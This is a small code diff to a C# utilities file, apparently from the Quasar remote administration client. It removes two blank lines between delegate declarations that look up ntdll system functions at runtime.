@@ -10,7 +10,6 @@ namespace Quasar.Client.Utilities
         internal delegate IntPtr NtCurrentTebProc();
         internal static IntPtr NtCurrentTeb() => Lookup<NtCurrentTebProc>("ntdll.dll", "NtCurrentTeb")();
 
-
         internal delegate NT_STATUS NtQuerySystemInformationProc(
             [In] SYSTEM_INFORMATION_CLASS SystemInformationClass,
             [In] IntPtr SystemInformation,
@@ -21,7 +20,6 @@ namespace Quasar.Client.Utilities
             [In] IntPtr SystemInformation,
             [In] int SystemInformationLength,
             [Out] out int ReturnLength) => Lookup<NtQuerySystemInformationProc>("ntdll.dll", "NtQuerySystemInformation")(SystemInformationClass, SystemInformation, SystemInformationLength, out ReturnLength);
-
 
         internal delegate NT_STATUS NtQueryInformationProcessProc(
             [In] IntPtr ProcessHandle,
